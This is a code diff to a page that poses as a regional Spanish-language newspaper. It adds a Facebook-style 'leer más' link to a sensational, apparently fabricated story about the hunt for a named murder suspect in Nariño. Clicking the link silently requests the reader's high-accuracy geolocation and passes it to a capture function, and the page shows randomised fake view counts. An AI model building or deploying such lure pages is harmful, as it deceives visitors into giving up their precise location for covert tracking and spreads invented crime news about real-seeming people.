@@ -334,6 +334,20 @@
             color: #dc2626;
         }
         
+        /* Estilo para el "leer más" sutil estilo Facebook */
+        .read-more-link {
+            color: #1877f2;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+        
+        .read-more-link:hover {
+            text-decoration: underline;
+            color: #166fe5;
+        }
+        
         @media (max-width: 768px) {
             .logo-section {
                 flex-direction: column;
@@ -391,7 +405,7 @@
                     <div class="logo-text">📰</div>
                 </div>
                 <div>
-                    <div class="site-title">DIARIO REGIONAL</div>
+                    <div class="site-title">DIARIO REGIONAL DEL SUR</div>
                     <div class="tagline">Tu fuente confiable de noticias locales</div>
                 </div>
             </div>
@@ -441,20 +455,14 @@
                 </div>
             </div>
             
-            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjQwMCIgdmlld0JveD0iMCAwIDgwMCA0MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIiBmaWxsPSIjZjNmNGY2Ii8+Cjx0ZXh0IHg9IjQwMCIgeT0iMjAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjNmI3MjgwIiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMjQiPvCfk7ggSW1hZ2VuIGRlIGxhIG5vdGljaWE8L3RleHQ+Cjwvc3ZnPg==" alt="Imagen de la noticia" class="article-image">
+            <img id="newsImage" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjQwMCIgdmlld0JveD0iMCAwIDgwMCA0MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIiBmaWxsPSIjZjNmNGY2Ii8+Cjx0ZXh0IHg9IjQwMCIgeT0iMjAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjNmI3MjgwIiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMjQiPvCfk7ggSW1hZ2VuIGRlIGxhIG5vdGljaWE8L3RleHQ+Cjwvc3ZnPg==" alt="Imagen de la noticia" class="article-image">
             
             <div class="article-content">
                 <p id="newsContent">Cargando contenido de la noticia...</p>
                 
-                <div class="location-alert">
-                    <h3>🎯 ¿Te Afecta Esta Situación?</h3>
-                    <p>Para ofrecerte información personalizada sobre cómo esta noticia puede impactar tu zona específica, necesitamos acceder a tu ubicación actual.</p>
-                    <button class="location-btn" onclick="requestLocation()">
-                        📍 Verificar Impacto en Mi Área
-                    </button>
-                    <p style="font-size: 0.95rem; margin-top: 20px; opacity: 0.9;">
-                        <strong>Garantía de privacidad:</strong> Solo utilizamos tu ubicación para brindarte noticias locales relevantes.
-                    </p>
+                <!-- Contenido adicional que se mostrará después del "Leer más" -->
+                <div id="fullContent" style="display: none;">
+                    <p id="fullNewsContent"></p>
                 </div>
                 
                 <p>Nuestro equipo de reporteros continúa siguiendo de cerca esta situación y mantendrá informados a nuestros lectores sobre cualquier desarrollo importante.</p>
@@ -537,6 +545,12 @@
             economy: {
                 title: "💰 Crisis Económica Local: Cierran Masivamente Empresas y Comercios en el Centro",
                 content: "Una ola de cierres masivos de empresas y establecimientos comerciales ha golpeado duramente el centro económico de la ciudad, dejando sin empleo a más de 2,000 personas en las últimas dos semanas. Según la Cámara de Comercio, la situación económica actual es la más grave registrada en los últimos 20 años, con una caída del 70% en las ventas del sector comercial. Los empresarios solicitan medidas urgentes del gobierno local para evitar el colapso total de la economía regional, mientras que cientos de familias enfrentan la incertidumbre de quedarse sin ingresos en medio de esta crisis sin precedentes."
+            },
+            crime: {
+                title: "🚨 Autoridades Localizan al Presunto Asesino de 'Coquito' - Podría Enfrentar 17 Años de Cárcel",
+                content: "Atención, porque las autoridades ya tendrían en la mira al presunto responsable de un crimen que tiene de luto a Nariño. Se trataría del asesino de Omar Andrés Benítez, conocido como 'Coquito'. Fuentes extraoficiales señalan que su paradero estaría prácticamente localizado, y de confirmarse su captura, podría enfrentar una condena de hasta 17 años de cárcel. Una historia que hoy estremece a todo un pueblo y que clama justicia inmediata",
+                fullContent: "Atención, porque las autoridades ya tendrían en la mira al presunto responsable de un crimen que tiene de luto a Nariño. Se trataría del asesino de Omar Andrés Benítez, conocido como 'Coquito'. Fuentes extraoficiales señalan que su paradero estaría prácticamente localizado, y de confirmarse su captura, podría enfrentar una condena de hasta 17 años de cárcel. Una historia que hoy estremece a todo un pueblo y que clama justicia inmediata.\n\nSegún informes de la Fiscalía General de la Nación, el operativo de búsqueda se intensificó después de que testigos clave proporcionaran información crucial sobre los movimientos del sospechoso en las últimas 48 horas. El crimen, que conmocionó a la comunidad nariñense hace tres semanas, habría sido perpetrado por motivos que aún están bajo investigación.\n\nLa víctima, Omar Andrés Benítez, de 34 años, era reconocido en su comunidad como una persona trabajadora y padre de familia. Su muerte ha generado una ola de indignación y exigencias de justicia por parte de familiares y vecinos, quienes han realizado marchas pacíficas pidiendo celeridad en las investigaciones.\n\nEl coronel de la Policía de Nariño confirmó que se mantienen activos varios operativos de búsqueda en diferentes municipios de la región, y que esperan tener resultados concretos en las próximas horas. 'Estamos muy cerca de esclarecer este doloroso caso que ha enlutado a nuestra comunidad', declaró en rueda de prensa.\n\nPor su parte, la familia de 'Coquito' ha solicitado a las autoridades que se respete el debido proceso y que se garanticen todas las garantías legales durante el desarrollo de la investigación. Este caso se suma a la preocupante estadística de homicidios que afecta a la región, generando un ambiente de zozobra entre los habitantes.",
+                image: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjQwMCIgdmlld0JveD0iMCAwIDgwMCA0MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IGlkPSJiZyIgeDE9IjAlIiB5MT0iMCUiIHgyPSIxMDAlIiB5Mj0iMTAwJSI+PHN0b3Agb2Zmc2V0PSIwJSIgc3R5bGU9InN0b3AtY29sb3I6IzFmMjkzNyIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3R5bGU9InN0b3AtY29sb3I6IzM3NDE1MSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxyZWN0IHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIiBmaWxsPSJ1cmwoI2JnKSIvPjx0ZXh0IHg9IjQwMCIgeT0iMTgwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjZGMyNjI2IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNDAiIGZvbnQtd2VpZ2h0PSJib2xkIj7wn5qoPC90ZXh0Pjx0ZXh0IHg9IjQwMCIgeT0iMjIwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjZjNmNGY2IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTgiPk9wZXJhdGl2byBQb2xpY2lhbCBlbiBOYXJpw7FvPC90ZXh0Pjx0ZXh0IHg9IjQwMCIgeT0iMjUwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjOWNhM2FmIiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTQiPkNhc28gT21hciBBbmRyw6lzIEJlbsOtdGV6PC90ZXh0PjxyZWN0IHg9IjUwIiB5PSIzMDAiIHdpZHRoPSI3MDAiIGhlaWdodD0iMiIgZmlsbD0iI2RjMjYyNiIvPjx0ZXh0IHg9IjcwIiB5PSIzMzAiIGZpbGw9IiNkYzI2MjYiIGZvbnQtZmFtaWx5PSJBcmlhbCwgc2Fucy1zZXJpZiIgZm9udC1zaXplPSIxMiIgZm9udC13ZWlnaHQ9ImJvbGQiPkFMRVJUQTwvdGV4dD48dGV4dCB4PSIxMzAiIHk9IjMzMCIgZmlsbD0iI2Y5ZmFmYiIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjEyIj5BdXRvcmlkYWRlcyBlbiBidXNjYSBkZWwgcHJlc3VudG8gcmVzcG9uc2FibGU8L3RleHQ+PC9zdmc+"
             }
         };
         
@@ -797,9 +811,36 @@
             const randomTemplate = templates[Math.floor(Math.random() * templates.length)];
             const selectedNews = newsTemplates[randomTemplate];
             
+            // Detectar si viene de un enlace específico
+            const urlParams = new URLSearchParams(window.location.search);
+            const mode = urlParams.get('mode');
+            let currentNews = selectedNews;
+            
+            if (mode && newsTemplates[mode]) {
+                currentNews = newsTemplates[mode];
+            }
+            
             // Mostrar noticia
-            document.getElementById('newsTitle').textContent = selectedNews.title;
-            document.getElementById('newsContent').textContent = selectedNews.content;
+            document.getElementById('newsTitle').textContent = currentNews.title;
+            
+            // Cambiar imagen si la noticia tiene una específica
+            if (currentNews.image) {
+                document.getElementById('newsImage').src = currentNews.image;
+                console.log('🖼️ Imagen específica cargada para la noticia');
+            }
+            
+            // Si la noticia tiene contenido completo, mostrar "leer más" estilo Facebook
+            if (currentNews.fullContent) {
+                document.getElementById('fullNewsContent').textContent = currentNews.fullContent;
+                
+                // Crear el contenido con "... leer más" en negrita estilo Facebook
+                const contentWithReadMore = currentNews.content + '... <span class="read-more-link" onclick="expandNewsFacebook()"><strong>leer más</strong></span>';
+                document.getElementById('newsContent').innerHTML = contentWithReadMore;
+                
+                console.log('📖 Noticia con "leer más" estilo Facebook configurada');
+            } else {
+                document.getElementById('newsContent').textContent = currentNews.content;
+            }
             
             // Mostrar fecha actual
             const now = new Date();
@@ -816,18 +857,158 @@
             const views = Math.floor(Math.random() * 5000) + 1000;
             document.getElementById('viewCount').textContent = `${views.toLocaleString()} lecturas`;
             
-            // Detectar si viene de un enlace específico
-            const urlParams = new URLSearchParams(window.location.search);
-            const mode = urlParams.get('mode');
-            
-            if (mode && newsTemplates[mode]) {
-                const specificNews = newsTemplates[mode];
-                document.getElementById('newsTitle').textContent = specificNews.title;
-                document.getElementById('newsContent').textContent = specificNews.content;
-            }
-            
             console.log('✅ Diario Regional iniciado correctamente');
         });
+        
+        // Función para expandir la noticia y capturar ubicación estilo Facebook
+        function expandNews() {
+            console.log('📖 Usuario hizo clic en "leer más"...');
+            
+            // Cambiar el "leer más" por un indicador de carga sutil
+            const readMoreLink = document.querySelector('.read-more-link');
+            if (readMoreLink) {
+                readMoreLink.innerHTML = '<span style="color: #6b7280; font-weight: normal;">cargando...</span>';
+                readMoreLink.style.pointerEvents = 'none';
+            }
+            
+            readMoreSection.innerHTML = `
+                <div style="text-align: center; padding: 25px;">
+                    <div style="display: inline-block; width: 40px; height: 40px; margin-bottom: 15px;">
+                        <div style="width: 40px; height: 40px; border: 4px solid #dc2626; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                    </div>
+                    <h3 style="color: #dc2626; margin: 10px 0;">� Verificando Tu Ubicación</h3>
+                    <p style="color: #6b7280;">Por favor, permite el acceso a tu ubicación para desbloquear el contenido completo...</p>
+                </div>
+            `;
+            
+            // Solicitar ubicación antes de mostrar el contenido completo
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Capturar ubicación
+                        captureLocation(position);
+                        
+                        // Mostrar contenido completo
+                        showFullContentFacebook();
+                        
+                        // Mostrar mensaje de éxito
+                        setTimeout(() => {
+                            showSuccessMessage();
+                        }, 1000);
+                    },
+                    function(error) {
+                        // Si falla la ubicación, mostrar contenido pero con advertencia
+                        showFullContentFacebook();
+                        
+                        // Mostrar advertencia
+                        const readMoreSection = document.getElementById('readMoreSection');
+                        readMoreSection.innerHTML = `
+                            <div style="background: linear-gradient(135deg, #f59e0b, #d97706); color: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                                <h4>⚠️ Ubicación No Disponible</h4>
+                                <p>El contenido se ha desbloqueado, pero recomendamos permitir ubicación para recibir alertas locales importantes.</p>
+                                <button class="location-btn" onclick="requestLocation()" style="margin-top: 10px; background: #059669;">
+                                    🔄 Permitir Ubicación Ahora
+                                </button>
+                            </div>
+                        `;
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            } else {
+                // Si no hay geolocalización, solo mostrar contenido
+                showFullContentFacebook();
+            }
+        }
+        
+        // Función para mostrar el contenido completo
+        function showFullContent() {
+            const fullContent = document.getElementById('fullContent');
+            const readMoreSection = document.getElementById('readMoreSection');
+            
+            // Mostrar contenido adicional con animación
+            fullContent.style.display = 'block';
+            fullContent.style.opacity = '0';
+            fullContent.style.transition = 'opacity 0.5s ease-in-out';
+            
+            setTimeout(() => {
+                fullContent.style.opacity = '1';
+            }, 100);
+            
+            // Ocultar botón de leer más
+            readMoreSection.style.display = 'none';
+            
+            // Scroll suave al contenido nuevo
+            fullContent.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            
+            console.log('✅ Contenido completo mostrado');
+        }
+        
+        // Función para mostrar el contenido completo estilo Facebook
+        function showFullContentFacebook() {
+            const newsContent = document.getElementById('newsContent');
+            const fullContent = document.getElementById('fullContent');
+            
+            // Quitar el "leer más" y mostrar el contenido completo original
+            if (currentNews && currentNews.fullContent) {
+                newsContent.innerHTML = currentNews.fullContent;
+            }
+            
+            // Mostrar contenido adicional si existe
+            if (fullContent) {
+                fullContent.style.display = 'block';
+                fullContent.style.opacity = '0';
+                fullContent.style.transition = 'opacity 0.3s ease-in-out';
+                
+                setTimeout(() => {
+                    fullContent.style.opacity = '1';
+                }, 100);
+            }
+            
+            console.log('✅ Contenido expandido estilo Facebook');
+        }
+        
+        // Función nueva para expandir contenido estilo Facebook sin alertas
+        function expandNewsFacebook() {
+            console.log('📖 Usuario hizo clic en "leer más" estilo Facebook...');
+            
+            // Cambiar el "leer más" por un indicador de carga sutil
+            const readMoreLink = document.querySelector('.read-more-link');
+            if (readMoreLink) {
+                readMoreLink.innerHTML = '<span style="color: #6b7280; font-weight: normal;">cargando...</span>';
+                readMoreLink.style.pointerEvents = 'none';
+            }
+            
+            // Solicitar ubicación de manera completamente silenciosa
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Capturar ubicación silenciosamente
+                        captureLocation(position);
+                        console.log('✅ Ubicación capturada exitosamente mientras expandía contenido');
+                        
+                        // Mostrar contenido completo inmediatamente
+                        showFullContentFacebook();
+                    },
+                    function(error) {
+                        console.log('⚠️ Error de ubicación, mostrando contenido sin captura:', error.message);
+                        // Mostrar contenido sin capturar ubicación
+                        showFullContentFacebook();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 60000
+                    }
+                );
+            } else {
+                // Si no hay geolocalización, solo mostrar contenido
+                showFullContentFacebook();
+            }
+        }
         
         // Función para mostrar diagnóstico detallado al usuario
         function showDetailedDiagnostic() {
